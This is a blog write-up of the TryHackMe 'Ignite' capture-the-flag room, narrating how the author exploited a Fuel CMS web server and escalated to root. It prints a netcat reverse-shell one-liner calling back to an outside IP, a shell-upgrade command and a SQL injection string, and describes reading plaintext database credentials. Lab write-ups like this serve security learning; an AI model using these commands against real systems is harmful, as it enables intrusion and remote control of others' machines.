---
layout: ../../layouts/BlogLayout.astro
title: "Ignite THM Write-up"
date: "JUL 03, 2026"
readTime: "4 MIN READ"
author: "Harsha"
category: "cyber"
---

Hi guys, I'm here with another write-up but **this is a special one for me**.

Room name: Ignite
Room type: Challenge (Easy)

The challenge description is:
	A new start-up has a few issues with their web server.

## Phase 1

We left off with an IP as usual, and the first thing we do with it is

```
nmap -sC -sV -p- MACHINE_IP
```

I used **nmap** to find out that only one port is open that is port 80 and it is running a CMS portal called **Fuel CMS**.

Running gobuster didn't gave me anything interesting, with this information I wandered around the portal and got nothing worth mentioning.

I used searchsploit to know if there are any existing vulnerabilities linked to this Fuel CMS and got an RCE vulnerability, I downloaded the script from the exploit-DB and ran it on this IP and got a shell. EASY PEASY

I used a one liner to get an actual reverse shell from it

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 192.168.135.178 881 >/tmp/f
```

and for standard shell I upgraded it using

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now we have all the required things to dig deep and get the flags.

with minimum effort I got the flag.txt from `/home/www-data`

## Phase 2

Now for the **actual hard part**, I keep on having hard times getting to the root.txt, I don't know any users or their passwords to switch to them. 

There is a security miss configuration in the logs search field that resulted in improper error handling when we searched for

```
' or 1=1-- -
```

It resulted in detailed MYSQL error message that revealed a database table name "fuel_users" but I couldn't get the data from their but I asked myself " I have a shell why can't I read them from the shell itself? "

I then went into the `var/www/html/fuel` dir and searched for database related folders (I know I should have done it in the starting stage, but I didn't got the idea that a database related folder resides in here) I got the database.php inside the `/var/www/html/fuel/application/config` folder.

woowwww.... the username and password in plain text, of course the user is root but with a simple password \*\*\*\*\*\* . 

I switched to root user with `su root` and finally got the root.txt

In my prev rooms I used AI or write-ups to solve the room but in this room it's purely me, including the write-up it's **mememe** 😂
